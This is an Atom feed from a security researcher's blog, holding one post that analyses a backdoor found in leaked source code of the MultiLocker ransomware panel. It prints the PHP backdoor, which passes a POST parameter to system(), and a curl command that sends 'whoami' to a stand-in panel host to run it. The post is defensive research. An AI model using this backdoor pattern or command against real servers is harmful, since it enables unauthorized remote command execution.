<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: backdoor | bwall - Brian Wallace]]></title>
  <link href="https://bwall.github.io/blog/categories/backdoor/atom.xml" rel="self"/>
  <link href="https://bwall.github.io/"/>
  <updated>2014-03-09T22:10:28-07:00</updated>
  <id>https://bwall.github.io/</id>
  <author>
    <name><![CDATA[Brian Wallace]]></name>
    <email><![CDATA[nightstrike9809@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[MultiLocker Backdoor]]></title>
    <link href="https://bwall.github.io/blog/2014/03/09/multilocker-backdoor/"/>
    <updated>2014-03-09T17:28:07-07:00</updated>
    <id>https://bwall.github.io/blog/2014/03/09/multilocker-backdoor</id>
    <content type="html"><![CDATA[<p>In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&rsquo;s panel.</p>

<!-- more -->


<p>While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &lsquo;lending/PL.php&rsquo;, there is some obvious backdoor code.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>MultiLocker Backdoor code </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">c</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">c</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]);</span>
</span><span class='line'><span class="k">die</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This can easily be accessed with curl or wget (let&rsquo;s assume <a href="http://c2.panel/">http://c2.panel/</a> is the MultiLocker panel root).
<code>
curl -v -d "c=whoami" http://c2.panel/lending/PL.php
</code></p>

<p>For more information on MultiLocker, you can check out a great blog post on it <a href="http://www.xylibox.com/2012/11/multi-locker.html">here</a>.</p>
]]></content>
  </entry>
  
</feed>
